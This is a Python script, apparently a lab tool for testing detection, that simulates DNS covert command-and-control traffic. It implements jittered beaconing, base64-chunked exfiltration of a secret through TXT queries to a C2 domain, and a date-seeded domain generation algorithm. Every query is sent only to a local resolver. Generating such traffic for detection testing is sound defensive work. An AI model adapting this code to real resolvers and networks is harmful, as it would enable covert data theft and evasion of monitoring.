#!/usr/bin/env python3
from __future__ import annotations

import argparse
import base64
import hashlib
import random
import time
from dataclasses import dataclass
from datetime import datetime, timezone

from loguru import logger

try:
    import dns.exception
    import dns.resolver
except Exception:  # pragma: no cover
    dns = None


@dataclass
class AttackConfig:
    mode: str
    duration: int
    c2_domain: str
    interval: float
    secret: str


def resolver_local_only() -> "dns.resolver.Resolver | None":
    if dns is None:
        return None
    r = dns.resolver.Resolver(configure=False)
    r.nameservers = ["127.0.0.1"]
    r.port = 53
    r.timeout = 1.0
    r.lifetime = 1.0
    return r


def send_query(r: "dns.resolver.Resolver | None", qname: str, qtype: str = "A") -> None:
    logger.info(f"[ATTACK] query={qname} type={qtype}")
    if r is None:
        return
    try:
        r.resolve(qname, qtype)
    except (dns.resolver.NXDOMAIN, dns.resolver.Timeout, dns.resolver.NoAnswer):
        pass
    except dns.exception.DNSException:
        pass
    except Exception:
        pass


def beaconing(r: "dns.resolver.Resolver | None", c2_domain: str, duration: int, interval: float) -> None:
    end = time.time() + duration
    while time.time() < end:
        qname = f"alive-host7.{c2_domain}"
        send_query(r, qname, "A")
        jitter = random.uniform(-1.0, 1.0)
        time.sleep(max(0.1, interval + jitter))


def exfiltration(r: "dns.resolver.Resolver | None", c2_domain: str, secret: str) -> None:
    chunks = [secret[i : i + 30] for i in range(0, len(secret), 30)]
    for idx, ch in enumerate(chunks):
        b64 = base64.b64encode(ch.encode()).decode()
        qname = f"chunk{idx}.{b64}.{c2_domain}"
        send_query(r, qname, "TXT")
        time.sleep(0.3)


def dga(r: "dns.resolver.Resolver | None", c2_domain: str, n: int = 50, seed: str | None = None) -> None:
    seed = seed or datetime.now(timezone.utc).strftime("%Y%m%d")
    for i in range(n):
        sub = hashlib.md5(f"{seed}{i}".encode()).hexdigest()[:12]
        qname = f"{sub}.{c2_domain}"
        send_query(r, qname, "A")
        time.sleep(0.2)


def full_session(r: "dns.resolver.Resolver | None", c2_domain: str, interval: float, secret: str) -> None:
    beaconing(r, c2_domain, duration=60, interval=interval)
    exfiltration(r, c2_domain, secret)
    dga(r, c2_domain, n=30)
    beaconing(r, c2_domain, duration=120, interval=interval)


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="Simulate DNS covert C2 traffic")
    p.add_argument("--mode", choices=["beacon", "exfil", "dga", "full"], default="full")
    p.add_argument("--duration", type=int, default=120)
    p.add_argument("--c2-domain", default="labdomain.internal")
    p.add_argument("--interval", type=float, default=15.0)
    p.add_argument("--secret", default="this is a secret payload from compromised endpoint")
    return p.parse_args()


def main() -> None:
    args = parse_args()
    logger.remove()
    logger.add(lambda msg: print(msg, end=""), colorize=True)

    r = resolver_local_only()
    logger.warning(
        "Attack simulator running in safe local mode: all queries target local DNS resolver only"
    )

    if args.mode == "beacon":
        beaconing(r, args.c2_domain, args.duration, args.interval)
    elif args.mode == "exfil":
        exfiltration(r, args.c2_domain, args.secret)
    elif args.mode == "dga":
        dga(r, args.c2_domain)
    else:
        full_session(r, args.c2_domain, args.interval, args.secret)


if __name__ == "__main__":
    main()
